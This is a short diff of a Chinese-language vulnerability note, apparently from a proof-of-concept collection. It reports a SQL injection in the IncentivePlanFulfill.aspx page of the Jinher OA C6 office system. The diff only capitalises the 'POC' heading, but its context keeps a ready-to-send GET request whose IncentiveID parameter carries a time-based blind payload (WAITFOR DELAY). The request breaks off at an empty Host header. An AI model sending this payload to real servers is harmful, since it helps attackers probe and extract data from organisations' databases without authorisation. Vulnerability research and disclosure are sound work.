@@ -1,7 +1,7 @@
 ## 金和OA-C6-IncentivePlanFulfill.aspx存在SQL注入漏洞
 
 
-## poc
+## POC
 ```
 GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1WAITFOR+DELAY+%270:0:6%27--&TVersion=1 HTTP/1.1
 Host:
